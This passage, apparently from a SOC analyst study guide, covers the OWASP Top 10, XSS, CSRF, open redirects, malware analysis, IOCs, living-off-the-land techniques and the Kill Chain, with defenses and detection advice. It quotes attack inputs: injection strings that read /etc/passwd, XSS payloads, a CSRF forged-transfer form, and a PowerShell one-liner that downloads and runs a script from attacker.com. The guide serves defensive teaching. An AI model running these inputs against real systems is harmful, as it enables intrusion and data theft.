st to escalate privileges.<\/li>\n<\/ul>\n<\/li>\n<li><strong>Causes<\/strong>:<ul>\n<li>Missing authorization checks.<\/li>\n<li>Insecure direct object references (IDOR).<\/li>\n<li>Horizontal/vertical privilege escalation.<\/li>\n<\/ul>\n<\/li>\n<li><strong>Mitigation<\/strong>: Enforce authorization on all requests; principle of least privilege; use RBAC.<\/li>\n<li><strong>SOC Detection<\/strong>: Monitor for 403 (Forbidden) errors followed by successful 200 (OK) responses; unusual access patterns.<\/li>\n<\/ul>\n<h3>2. Cryptographic Failures<\/h3>\n<ul>\n<li><strong>Definition<\/strong>: Data in transit/at rest not properly encrypted or hashed.<\/li>\n<li><strong>Examples<\/strong>:<ul>\n<li>Passwords stored as plaintext.<\/li>\n<li>Sensitive data sent over HTTP (not HTTPS).<\/li>\n<li>Weak encryption (DES, RC4).<\/li>\n<li>Hardcoded encryption keys in code.<\/li>\n<\/ul>\n<\/li>\n<li><strong>Mitigation<\/strong>:<ul>\n<li>Use HTTPS/TLS for all data in transit.<\/li>\n<li>Hash passwords with bcrypt/Argon2.<\/li>\n<li>Encrypt sensitive data at rest (AES-256).<\/li>\n<li>Rotate encryption keys regularly.<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC Detection<\/strong>: Monitor for HTTP (unencrypted) traffic carrying credentials; weak ciphers in TLS handshakes.<\/li>\n<\/ul>\n<h3>3. Injection (SQLi, OS Command Injection, LDAP Injection)<\/h3>\n<ul>\n<li><strong>Definition<\/strong>: Attacker inserts malicious code into application input.<\/li>\n<\/ul>\n<h4>SQL Injection (SQLi)<\/h4>\n<p><strong>Vulnerable Code<\/strong>:<\/p>\n<pre><code class=\"language-python\">query = &quot;SELECT * FROM users WHERE username=&#39;&quot; + username + &quot;&#39; AND password=&#39;&quot; + password + &quot;&#39;&quot;\ndb.execute(query)\n<\/code><\/pre>\n<p><strong>Attack<\/strong>:<\/p>\n<ul>\n<li>Input: <code>username = admin&#39; --<\/code><\/li>\n<li>Query becomes: <code>SELECT * FROM users WHERE username=&#39;admin&#39; --&#39; AND password=&#39;...&#39;<\/code><\/li>\n<li><code>--<\/code> comments out rest; query returns admin user without password check.<\/li>\n<\/ul>\n<p><strong>Real-World Impact<\/strong>:<\/p>\n<ul>\n<li>Dump entire database.<\/li>\n<li>Modify/delete data.<\/li>\n<li>Read files from server.<\/li>\n<li>Execute OS commands (depending on DB).<\/li>\n<\/ul>\n<p><strong>Defense<\/strong>:<\/p>\n<ul>\n<li>Parameterized queries (prepared statements):<\/li>\n<\/ul>\n<pre><code class=\"language-python\">query = &quot;SELECT * FROM users WHERE username=? AND password=?&quot;\ndb.execute(query, (username, password))\n<\/code><\/pre>\n<ul>\n<li>Input validation (whitelist, length, type).<\/li>\n<li>ORM frameworks (Django ORM, SQLAlchemy).<\/li>\n<\/ul>\n<h4>Command Injection<\/h4>\n<p><strong>Vulnerable Code<\/strong>:<\/p>\n<pre><code class=\"language-bash\">cmd = &quot;ping &quot; + hostname\nos.system(cmd)\n<\/code><\/pre>\n<p><strong>Attack<\/strong>:<\/p>\n<ul>\n<li>Input: <code>hostname = 8.8.8.8; cat /etc/passwd<\/code><\/li>\n<li>Command: <code>ping 8.8.8.8; cat /etc/passwd<\/code><\/li>\n<li>Attacker reads sensitive files.<\/li>\n<\/ul>\n<p><strong>Defense<\/strong>:<\/p>\n<ul>\n<li>Avoid shell commands; use libraries.<\/li>\n<li>Input validation.<\/li>\n<li>Use subprocess with array, not shell=True.<\/li>\n<\/ul>\n<h3>4. Insecure Design<\/h3>\n<ul>\n<li><strong>Definition<\/strong>: Missing security controls in design phase.<\/li>\n<li><strong>Examples<\/strong>:<ul>\n<li>No rate limiting on login → brute force.<\/li>\n<li>No CSRF protection → account hijacking.<\/li>\n<li>Weak password policy → easy guessing.<\/li>\n<\/ul>\n<\/li>\n<li><strong>Mitigation<\/strong>: Threat modeling, security requirements, secure design patterns.<\/li>\n<\/ul>\n<h3>5. Security Misconfiguration<\/h3>\n<ul>\n<li><strong>Definition<\/strong>: Insecure default settings, incomplete setups, unnecessary features.<\/li>\n<li><strong>Examples<\/strong>:<ul>\n<li>Default credentials (admin/admin).<\/li>\n<li>Unnecessary ports/services enabled.<\/li>\n<li>Debug mode on in production.<\/li>\n<li>Overly permissive CORS.<\/li>\n<li>Exposed sensitive files (.git, .env, backup files).<\/li>\n<\/ul>\n<\/li>\n<li><strong>Mitigation<\/strong>:<ul>\n<li>Minimal installation (only needed software).<\/li>\n<li>Change defaults.<\/li>\n<li>Security scanning tools (Nessus, Qualys).<\/li>\n<li>Infrastructure as Code with security checks.<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC Detection<\/strong>: Monitor for requests to common sensitive paths (/.git, /.env, /admin, /backup).<\/li>\n<\/ul>\n<h3>6. Vulnerable and Outdated Components<\/h3>\n<ul>\n<li><strong>Definition<\/strong>: Using libraries, frameworks, plugins with known CVEs.<\/li>\n<li><strong>Examples<\/strong>:<ul>\n<li>Old version of jQuery with XSS vulnerability.<\/li>\n<li>Outdated OpenSSL with heartbleed.<\/li>\n<li>Unmaintained Node.js packages.<\/li>\n<\/ul>\n<\/li>\n<li><strong>Mitigation<\/strong>:<ul>\n<li>Dependency scanning (npm audit, OWASP Dependency Check).<\/li>\n<li>Keep up-to-date; monitor CVE feeds.<\/li>\n<li>Remove unnecessary dependencies.<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC Detection<\/strong>: Monitor library/software versions; cross-reference with CVE databases.<\/li>\n<\/ul>\n<h3>7. Identification and Authentication Failures<\/h3>\n<ul>\n<li><strong>Definition<\/strong>: Weak authentication; session management flaws.<\/li>\n<li><strong>Examples<\/strong>:<ul>\n<li>Plaintext session tokens.<\/li>\n<li>Brute-forcible login.<\/li>\n<li>Session fixation (attacker sets user&#39;s session ID).<\/li>\n<li>No MFA.<\/li>\n<\/ul>\n<\/li>\n<li><strong>Mitigation<\/strong>:<ul>\n<li>MFA/2FA.<\/li>\n<li>Strong password policy + rate limiting on login.<\/li>\n<li>Secure session management (HttpOnly, Secure, SameSite cookies).<\/li>\n<li>Password reset via email, not security questions.<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC Detection<\/strong>: Monitor failed login attempts; unusual session activity; MFA bypass attempts.<\/li>\n<\/ul>\n<h3>8. Software and Data Integrity Failures<\/h3>\n<ul>\n<li><strong>Definition<\/strong>: Insecure CI/CD, auto-update without verification, tampering with serialized data.<\/li>\n<li><strong>Examples<\/strong>:<ul>\n<li>Pulling code from untrusted sources.<\/li>\n<li>Not verifying signatures of updates.<\/li>\n<li>Deserialization of untrusted data (object injection).<\/li>\n<\/ul>\n<\/li>\n<li><strong>Mitigation<\/strong>:<ul>\n<li>Code signing and verification.<\/li>\n<li>Secure CI/CD pipeline.<\/li>\n<li>Avoid serialization of sensitive objects.<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC Detection<\/strong>: Monitor for code/application modifications; integrity checks.<\/li>\n<\/ul>\n<h3>9. Security Logging and Monitoring Failures<\/h3>\n<ul>\n<li><strong>Definition<\/strong>: Insufficient logging; no alerts; no forensics capability.<\/li>\n<li><strong>Examples<\/strong>:<ul>\n<li>No login attempt logging.<\/li>\n<li>No audit trail for sensitive operations.<\/li>\n<li>Logs stored without integrity protection.<\/li>\n<li>No alerting on anomalies.<\/li>\n<\/ul>\n<\/li>\n<li><strong>Mitigation<\/strong>:<ul>\n<li>Log authentication, access, data changes.<\/li>\n<li>Centralized logging (SIEM).<\/li>\n<li>Real-time alerting.<\/li>\n<li>Immutable logs.<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC Focus<\/strong>: This is your domain! Implement logging for all vulnerabilities above; correlate logs to detect attacks.<\/li>\n<\/ul>\n<h3>10. Server-Side Request Forgery (SSRF)<\/h3>\n<ul>\n<li><strong>Definition<\/strong>: Attacker tricks server into making unintended requests.<\/li>\n<li><strong>Example<\/strong>:<\/li>\n<\/ul>\n<pre><code>User enters URL to fetch: http://192.168.1.1/admin\nServer (trusted on internal network) fetches URL.\nServer returns internal admin page to attacker.\n<\/code><\/pre>\n<ul>\n<li><strong>Impact<\/strong>:<ul>\n<li>Access internal services (Redis, databases, cloud metadata).<\/li>\n<li>Port scanning.<\/li>\n<li>Credential harvesting.<\/li>\n<\/ul>\n<\/li>\n<li><strong>Mitigation<\/strong>:<ul>\n<li>URL validation (whitelist, blocklist internal IPs).<\/li>\n<li>Disable HTTP redirects or limit redirects.<\/li>\n<li>Network segmentation.<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n<hr>\n<h2>XSS (Cross-Site Scripting) – Deep-Dive<\/h2>\n<h3>Types<\/h3>\n<h4>Stored XSS (Persistent)<\/h4>\n<ul>\n<li><strong>How<\/strong>: Attacker injects script into database (comment, profile, post).<\/li>\n<li><strong>When<\/strong>: Others view the page, script executes in their browser.<\/li>\n<li><strong>Impact<\/strong>: Affects many users; long-lived.<\/li>\n<\/ul>\n<p><strong>Example<\/strong>:<\/p>\n<ul>\n<li>Attacker posts comment: <code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;<\/code><\/li>\n<li>Comment saved in DB without sanitization.<\/li>\n<li>Every user viewing the page gets XSS&#39;d.<\/li>\n<\/ul>\n<h4>Reflected XSS (Non-Persistent)<\/h4>\n<ul>\n<li><strong>How<\/strong>: Script in URL parameter; server reflects it in response.<\/li>\n<li><strong>When<\/strong>: User clicks malicious link.<\/li>\n<li><strong>Impact<\/strong>: Single user, requires click.<\/li>\n<\/ul>\n<p><strong>Example<\/strong>:<\/p>\n<ul>\n<li>Attacker crafts link: <code>example.com/search?q=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;<\/code><\/li>\n<li>Server returns page with script in it.<\/li>\n<li>User&#39;s browser executes script.<\/li>\n<\/ul>\n<h4>DOM-Based XSS<\/h4>\n<ul>\n<li><strong>How<\/strong>: Client-side JavaScript processes untrusted input unsafely.<\/li>\n<li><strong>When<\/strong>: JavaScript modifies DOM without sanitization.<\/li>\n<\/ul>\n<p><strong>Example<\/strong>:<\/p>\n<pre><code class=\"language-javascript\">// Vulnerable code\nvar searchTerm = location.hash.substring(1); // Get URL fragment\ndocument.getElementById(&#39;result&#39;).innerHTML = searchTerm; // Unsafe!\n\n// URL: example.com#&lt;img src=x onerror=&quot;alert(&#39;XSS&#39;)&quot;&gt;\n// Script executes on page.\n<\/code><\/pre>\n<h3>Payload Examples<\/h3>\n<pre><code class=\"language-html\">&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;\n&lt;img src=x onerror=&quot;alert(&#39;XSS&#39;)&quot;&gt;\n&lt;svg onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;\n&lt;body onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;\n&lt;iframe src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;\n&lt;input onfocus=&quot;alert(&#39;XSS&#39;)&quot; autofocus&gt;\n<\/code><\/pre>\n<h3>Defense<\/h3>\n<ul>\n<li><strong>Output Encoding<\/strong>: Encode special characters before sending to browser.<ul>\n<li><code>&lt;<\/code> → <code>&amp;lt;<\/code>, <code>&gt;<\/code> → <code>&amp;gt;<\/code>, <code>&quot;<\/code> → <code>&amp;quot;<\/code><\/li>\n<\/ul>\n<\/li>\n<li><strong>Input Validation<\/strong>: Whitelist allowed characters.<\/li>\n<li><strong>CSP (Content Security Policy)<\/strong>: Header limiting where scripts can come from.<\/li>\n<\/ul>\n<pre><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;\n<\/code><\/pre>\n<ul>\n<li><strong>Use Frameworks<\/strong>: Most modern frameworks (React, Vue, Angular) auto-encode by default.<\/li>\n<\/ul>\n<hr>\n<h2>CSRF (Cross-Site Request Forgery)<\/h2>\n<h3>How It Works<\/h3>\n<pre><code>1. User logs into bank.com, gets session cookie.\n2. User visits attacker.com without logging out of bank.\n3. attacker.com has hidden form:\n   &lt;form action=&quot;bank.com/transfer&quot; method=&quot;POST&quot;&gt;\n     &lt;input name=&quot;amount&quot; value=&quot;1000000&quot;&gt;\n     &lt;input name=&quot;to&quot; value=&quot;attacker_account&quot;&gt;\n     &lt;input type=&quot;submit&quot; value=&quot;Click here&quot;&gt;\n   &lt;/form&gt;\n4. User clicks link (or auto-submits form).\n5. Browser sends bank.com request WITH session cookie.\n6. Bank processes transfer (user authenticated).\n7. Attacker&#39;s account receives money.\n<\/code><\/pre>\n<h3>Why It Works<\/h3>\n<ul>\n<li>Browser automatically includes cookies for bank.com when requesting bank.com.<\/li>\n<li>Bank sees valid session → assumes request is legitimate.<\/li>\n<li>No way to distinguish user-initiated request from attacker&#39;s site.<\/li>\n<\/ul>\n<h3>Defense<\/h3>\n<ul>\n<li><strong>CSRF Tokens<\/strong>: Server generates unique token; form includes it.<ul>\n<li>Attacker can&#39;t predict token (not in cookie).<\/li>\n<li>Server verifies token before processing.<\/li>\n<\/ul>\n<\/li>\n<li><strong>SameSite Cookie<\/strong>: Browser doesn&#39;t send cookie for cross-site requests.<\/li>\n<\/ul>\n<pre><code>Set-Cookie: sessionid=...; SameSite=Strict\n<\/code><\/pre>\n<ul>\n<li><strong>Referer Check<\/strong>: Verify request came from your domain.<\/li>\n<\/ul>\n<hr>\n<h2>Open Redirects<\/h2>\n<h3>What &amp; How<\/h3>\n<ul>\n<li><strong>Vulnerability<\/strong>: App redirects to user-supplied URL without validation.<\/li>\n<li><strong>Example<\/strong>:<\/li>\n<\/ul>\n<pre><code>https://bank.com/logout?redirect_to=https://evil.com\nServer: redirect user to redirect_to parameter.\nResult: User redirected to evil.com after logout.\n<\/code><\/pre>\n<h3>Attack Scenario<\/h3>\n<ol>\n<li>Attacker crafts: <code>bank.com/logout?redirect_to=phishing.evil.com<\/code><\/li>\n<li>Attacker sends link in phishing email: &quot;Click to log out securely.&quot;<\/li>\n<li>User clicks, logs out from legitimate bank.com.<\/li>\n<li>User redirected to phishing.evil.com (looks like bank.com).<\/li>\n<li>User re-enters credentials into phishing site.<\/li>\n<\/ol>\n<h3>Defense<\/h3>\n<ul>\n<li><strong>Whitelist<\/strong>: Only allow redirects to known URLs.<\/li>\n<\/ul>\n<pre><code>allowed_redirects = [&#39;/&#39;, &#39;/home&#39;, &#39;/dashboard&#39;]\nif redirect_to not in allowed_redirects:\n    return error\n<\/code><\/pre>\n<ul>\n<li><strong>URL Validation<\/strong>: Ensure URL is same-origin.<\/li>\n<\/ul>\n<pre><code class=\"language-python\">from urllib.parse import urlparse\nparsed = urlparse(redirect_to)\nif parsed.netloc != request.host:\n    return error\n<\/code><\/pre>\n<ul>\n<li><strong>Relative URLs Only<\/strong>: Allow <code>/path<\/code> but not <code>//<\/code> or <code>http://<\/code>.<\/li>\n<\/ul>\n"},{"n":7,"title":"Malware & Threat Analysis","file":"chapters/07-malware-threat-analysis.md","covers":"classification, static and dynamic analysis, strings, IOCs, living-off-the-land","html":"<h2>Malware Classification<\/h2>\n<h3>By Execution Method<\/h3>\n<ul>\n<li><strong>Virus<\/strong>: Requires host file; spreads by modifying files.<\/li>\n<li><strong>Worm<\/strong>: Self-replicating; spreads via network without host.<\/li>\n<li><strong>Trojan<\/strong>: Masquerades as legitimate; user-triggered installation.<\/li>\n<li><strong>Ransomware<\/strong>: Encrypts files; demands payment for decryption.<\/li>\n<li><strong>Rootkit<\/strong>: Hides itself in OS kernel; maintains persistence.<\/li>\n<li><strong>Spyware<\/strong>: Monitors user activity; exfiltrates data.<\/li>\n<li><strong>Adware<\/strong>: Displays unwanted ads; may redirect browsers.<\/li>\n<\/ul>\n<h3>By Persistence Mechanism<\/h3>\n<ul>\n<li><strong>File-based<\/strong>: Registry modifications (Windows), config files (Linux).<\/li>\n<li><strong>Scheduled Tasks<\/strong>: Cron jobs (Linux), Task Scheduler (Windows).<\/li>\n<li><strong>Startup Folders<\/strong>: Auto-run on boot.<\/li>\n<li><strong>Browser Hijacking<\/strong>: Modifies homepage, search engine.<\/li>\n<li><strong>Kernel Rootkits<\/strong>: Loads kernel module (harder to detect).<\/li>\n<\/ul>\n<hr>\n<h2>Malware Analysis (SOC L1 Level)<\/h2>\n<h3>Dynamic Analysis (Behavioral)<\/h3>\n<ul>\n<li><strong>What<\/strong>: Run malware in isolated environment (sandbox); observe behavior.<\/li>\n<li><strong>Tools<\/strong>: Cuckoo Sandbox, ANY.RUN, Hybrid Analysis.<\/li>\n<li><strong>Observables<\/strong>:<ul>\n<li><strong>File Operations<\/strong>: Creates, modifies, deletes files (especially system dirs, registry).<\/li>\n<li><strong>Network<\/strong>: DNS queries, connections to IPs/domains, beaconing (periodic callback).<\/li>\n<li><strong>Process<\/strong>: Spawns child processes, injects code, escalates privileges.<\/li>\n<li><strong>Registry<\/strong> (Windows): Modifies Run keys, disables antivirus, hides files.<\/li>\n<li><strong>API Calls<\/strong>: Calls to system functions (e.g., CreateRemoteThread for injection).<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n<h3>Static Analysis (Code-Level)<\/h3>\n<ul>\n<li><strong>What<\/strong>: Examine malware without running (disassembly, decompilation).<\/li>\n<li><strong>Tools<\/strong>: IDA Pro, Ghidra (free), Radare2, Binary Ninja.<\/li>\n<li><strong>Limitations for SOC L1<\/strong>: Requires reverse engineering skills; time-consuming; often tool-expensive.<\/li>\n<li><strong>Practical Approach<\/strong>: Use hashes, strings extraction, yara rules instead.<\/li>\n<\/ul>\n<h3>String Extraction (Quick-Win for L1)<\/h3>\n<ul>\n<li><strong>How<\/strong>: Extract readable strings from binary.<\/li>\n<li><strong>What to look for<\/strong>:<ul>\n<li>C2 domains/IPs.<\/li>\n<li>Filenames (C:\\Windows\\Temp\\malware.exe).<\/li>\n<li>Registry paths.<\/li>\n<li>Error messages (&quot;Failed to connect to C2&quot;).<\/li>\n<li>Mutexes (unique name to prevent reinfection).<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n<p><strong>Example<\/strong>:<\/p>\n<pre><code class=\"language-bash\">strings malware.exe | grep -E &quot;\\.com|\\.net|http|C:\\\\&quot;\n<\/code><\/pre>\n<p><strong>Output<\/strong>:<\/p>\n<pre><code>http://attacker.com:8080/beacon\nC:\\Windows\\System32\\svchost.exe\nmutex_unique_id_12345\n<\/code><\/pre>\n<hr>\n<h2>IOCs (Indicators of Compromise)<\/h2>\n<h3>Types<\/h3>\n<table>\n<thead>\n<tr>\n<th align=\"left\">IOC<\/th>\n<th align=\"left\">Example<\/th>\n<th align=\"left\">Use<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td align=\"left\"><strong>File Hash<\/strong><\/td>\n<td align=\"left\">MD5, SHA-256 of malware<\/td>\n<td align=\"left\">Identify known malware<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>IP Address<\/strong><\/td>\n<td align=\"left\">192.168.1.100 (C2 server)<\/td>\n<td align=\"left\">Block C2 communication<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Domain/URL<\/strong><\/td>\n<td align=\"left\">attacker.com, bit.ly/malware<\/td>\n<td align=\"left\">Block via DNS/firewall; phishing detection<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>File Path<\/strong><\/td>\n<td align=\"left\">C:\\Windows\\Temp\\malware.exe<\/td>\n<td align=\"left\">Hunt for infection on endpoints<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Registry Key<\/strong><\/td>\n<td align=\"left\">HKLM\\Software\\Microsoft\\Windows\\Run<\/td>\n<td align=\"left\">Detect persistence mechanisms<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Email Header<\/strong><\/td>\n<td align=\"left\">From: <a href=\"mailto:attacker@phishing.com\">attacker@phishing.com<\/a><\/td>\n<td align=\"left\">Filter phishing emails<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Mutex<\/strong><\/td>\n<td align=\"left\">Global\\UniqueID12345<\/td>\n<td align=\"left\">Identify malware variant<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>User Agent<\/strong><\/td>\n<td align=\"left\">Mozilla/5.0 (BadBot)<\/td>\n<td align=\"left\">Identify malicious scanners<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Port<\/strong><\/td>\n<td align=\"left\">4444 (Metasploit default)<\/td>\n<td align=\"left\">Detect C2 beaconing<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>Process Name<\/strong><\/td>\n<td align=\"left\">svchost.exe (from wrong location)<\/td>\n<td align=\"left\">Identify process impersonation<\/td>\n<\/tr>\n<\/tbody><\/table>\n<h3>IOC Sources (OSINT)<\/h3>\n<ul>\n<li><strong>Public Feeds<\/strong>: AlienVault OTX, Abuse.ch, Shodan, VirusTotal.<\/li>\n<li><strong>Commercial<\/strong>: CrowdStrike, Mandiant, Proofpoint threat intel.<\/li>\n<li><strong>Internal<\/strong>: Your own SIEM logs, Splunk, Microsoft Sentinel.<\/li>\n<\/ul>\n<h3>Using IOCs in SOC<\/h3>\n<p><strong>Example Scenario<\/strong>:<\/p>\n<pre><code>Alert: File hash aaabbbcccddd created on endpoint.\nStep 1: Look up hash in VirusTotal.\nResult: 45 antivirus engines flag as Trojan.GenericDR.\nStep 2: Extract IOCs from malware report:\n  - C2: attacker-c2.com\n  - Port: 4444\n  - Regex pattern: process spawning cmd.exe from Temp\nStep 3: Hunt for other indicators:\n  - Search SIEM for other files with same hash.\n  - Search for connections to attacker-c2.com.\n  - Search for processes matching regex.\nStep 4: Escalate; quarantine all infected endpoints.\n<\/code><\/pre>\n<hr>\n<h2>Living-off-the-Land (LoTL) Attacks<\/h2>\n<h3>What &amp; Why<\/h3>\n<ul>\n<li><strong>Definition<\/strong>: Attacker uses built-in system tools (PowerShell, cmd.exe, WMI, psexec) instead of malware.<\/li>\n<li><strong>Advantage<\/strong>: Bypasses signature-based detection (tools are legitimate).<\/li>\n<li><strong>Challenge for SOC<\/strong>: Distinguish legitimate sysadmin activity from attack.<\/li>\n<\/ul>\n<h3>Common LoTL Tools<\/h3>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Tool<\/th>\n<th align=\"left\">OS<\/th>\n<th align=\"left\">Use<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td align=\"left\"><strong>PowerShell<\/strong><\/td>\n<td align=\"left\">Windows<\/td>\n<td align=\"left\">Script execution, lateral movement, credential theft<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>cmd.exe<\/strong><\/td>\n<td align=\"left\">Windows<\/td>\n<td align=\"left\">Command execution<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>WMI<\/strong> (wmic)<\/td>\n<td align=\"left\">Windows<\/td>\n<td align=\"left\">Remote execution (WMI event subscriptions for persistence)<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>psexec<\/strong><\/td>\n<td align=\"left\">Windows<\/td>\n<td align=\"left\">Remote command execution<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>at.exe<\/strong> / <strong>schtasks<\/strong><\/td>\n<td align=\"left\">Windows<\/td>\n<td align=\"left\">Scheduled tasks (persistence)<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>net.exe<\/strong><\/td>\n<td align=\"left\">Windows<\/td>\n<td align=\"left\">Network enumeration, user/group management<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>certutil.exe<\/strong><\/td>\n<td align=\"left\">Windows<\/td>\n<td align=\"left\">Download files, encode/decode (file transfer)<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>bitsadmin<\/strong><\/td>\n<td align=\"left\">Windows<\/td>\n<td align=\"left\">Download files (lives in \\System32)<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>curl/wget<\/strong><\/td>\n<td align=\"left\">Linux<\/td>\n<td align=\"left\">Download files, reverse shells<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>bash<\/strong><\/td>\n<td align=\"left\">Linux<\/td>\n<td align=\"left\">Script execution, reverse shells<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>ssh<\/strong><\/td>\n<td align=\"left\">Linux/Mac<\/td>\n<td align=\"left\">Remote access, tunneling<\/td>\n<\/tr>\n<tr>\n<td align=\"left\"><strong>cron<\/strong><\/td>\n<td align=\"left\">Linux<\/td>\n<td align=\"left\">Persistence (scheduled tasks)<\/td>\n<\/tr>\n<\/tbody><\/table>\n<h3>Real Attack Example: PowerShell LoTL<\/h3>\n<pre><code class=\"language-powershell\"># Attacker executes (legitimate-looking):\npowershell.exe -Command &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://attacker.com/payload.ps1&#39;)&quot;\n\n# What it does:\n# 1. IEX = Invoke-Expression (execute downloaded code).\n# 2. Downloads script from attacker server.\n# 3. Executes payload (e.g., create backdoor account, lateral movement).\n\n# Detection challenge:\n# - PowerShell is legitimate Windows tool.\n# - Sysadmins use it for legitimate scripts.\n# - Attacker blends in with normal admin activity.\n<\/code><\/pre>\n<h3>Detection Strategies (SOC Level 1)<\/h3>\n<ol>\n<li><strong>Monitor PowerShell Command Line<\/strong>: Log all executions (Windows Event ID 4688).<\/li>\n<li><strong>Look for Suspicious Patterns<\/strong>:<ul>\n<li>IEX (Invoke-Expression).<\/li>\n<li>DownloadString / WebClient.<\/li>\n<li>Base64 encoding (obfuscation).<\/li>\n<li>Credential theft (Get-Content, Invoke-Mimikatz).<\/li>\n<\/ul>\n<\/li>\n<li><strong>Whitelisting<\/strong>: Maintain list of approved scripts; alert on unknown.<\/li>\n<li><strong>Behavioral Analysis<\/strong>: PowerShell rarely needs network access (legitimate scripts usually read local files).<\/li>\n<\/ol>\n"},{"n":8,"title":"Attack Frameworks (Kill Chain, MITRE, Pyramid of Pain)","file":"chapters/08-attack-frameworks.md","covers":"Cyber Kill Chain, MITRE ATT&CK, Pyramid of Pain","html":"<h2>Cyber Kill Chain (Lockheed Martin)<\/h2>\n<h3>7 Stages<\/h3>\n<pre><code>1. RECONNAISSANCE\n   ↓ (attacker studies target)\n2. WEAPONIZATION\n   ↓ (attacker prepares payload)\n3. DELIVERY\n   ↓ (attacker sends payload to target)\n4. EXPLOITATION\n   ↓ (payload activates, vulnerability exploited)\n5. INSTALLATION\n   ↓ (malware/backdoor installed for persistence)\n6. COMMAND &amp; CONTROL (C2)\n   ↓ (attacker establishes communication)\n7. ACTIONS ON OBJECTIVES\n   ↓ (attacker achieves goals: exfiltrate, encrypt, etc.)\n<\/code><\/pre>\n<h3>Stage-by-Stage Breakdown<\/h3>\n<h4>1. Reconnaissance<\/h4>\n<ul>\n<li><strong>Definition<\/strong>: Attacker gathers info on target (OSINT).<\/li>\n<li><strong>Techniques<\/strong>:<ul>\n<li>WHOIS lookup (domain registration).<\/li>\n<li>Social media stalking (employee info, weak passwords).<\/li>\n<li>Shodan search (exposed services).<\/li>\n<li>DNS enumeration (subdomains, mail servers).<\/li>\n<li>Port scanning (nmap).<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC Mitigation<\/strong>: Monitor for unusual external scanning; restrict OSINT data exposure.<\/li>\n<\/ul>\n<h4>2. Weaponization<\/h4>\n<ul>\n<li><strong>Definition<\/strong>: Attacker creates exploit/payload.<\/li>\n<li><strong>Examples<\/strong>:<ul>\n<li>Malware binary.<\/li>\n<li>Phishing email with malicious attachment.<\/li>\n<li>Exploit kit for unpatched software.<\/li>\n<li>ROP gadgets (return-oriented programming for bypass).<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC Mitigation<\/strong>: Endpoint protection; antivirus scanning.<\/li>\n<\/ul>\n<h4>3. Delivery<\/h4>\n<ul>\n<li><strong>Definition<\/strong>: Attacker sends weaponized payload to target.<\/li>\n<li><strong>Methods<\/strong>:<ul>\n<li>Email (phishing).<\/li>\n<li>Website drive-by (watering hole).<\/li>\n<li>USB/removable media (physical).<\/li>\n<li>Software supply chain (update servers).<\/li>\n<li>C2 download.<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC Mitigation<\/strong>: Email filtering; web proxy; block known malware domains; sandbox suspicious files.<\/li>\n<\/ul>\n<h4>4. Exploitation<\/h4>\n<ul>\n<li><strong>Definition<\/strong>: Payload executes; vulnerability triggered.<\/li>\n<li><strong>Examples<\/strong>:<ul>\n<li>PDF reader vulnerability → code execution.<\/li>\n<li>SQL injection → database access.<\/li>\n<li>Phishing click → browser malware.<\/li>\n<li>Zero-day in unpatched OS.<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC Mitigation<\/strong>: Patch management; EDR (detects suspicious execution); application whitelisting.<\/li>\n<\/ul>\n<h4>5. Installation<\/h4>\n<ul>\n<li><strong>Definition<\/strong>: Malware/backdoor installed; persistence achieved.<\/li>\n<li><strong>Persistence Mechanisms<\/strong>:<ul>\n<li>Registry Run key (Windows).<\/li>\n<li>Cron job (Linux).<\/li>\n<li>Scheduled Task.<\/li>\n<li>Service creation.<\/li>\n<li>Rootkit (kernel-level).<\/li>\n<li>Web shell (web server backdoor).<\/li>\n<\/ul>\n<\/li>\n<li><strong>SOC Mitigation<\/strong>: Monitor registry/file changes; detect new services/tasks; FIM (file integrity monitoring).<\/li>\n<\/ul>\n<h4>6. Command &amp; Control (C2)<\/h4>\n<ul>\n<li><strong>Definition<\/strong>: Attacker establishes remote communication; sends commands.<\/li>\n<li><strong>C2 Methods<\/strong>:<ul>\n<li>Direct connection (IP:Port).<\/li>\n<li>DNS tunneling.<\/li>\n<li>HTTP/HTTPS beaconing.<\/li>\n<li>P2P networks.<\/li>\n<li>Encrypted channels (to avoid detection).<\/li>\n<\/ul>\n<\/li>\n<li><strong>Patterns<\/strong>:<ul>\n<li>Periodic &quot;beacon&quot; (callback to C2 every X 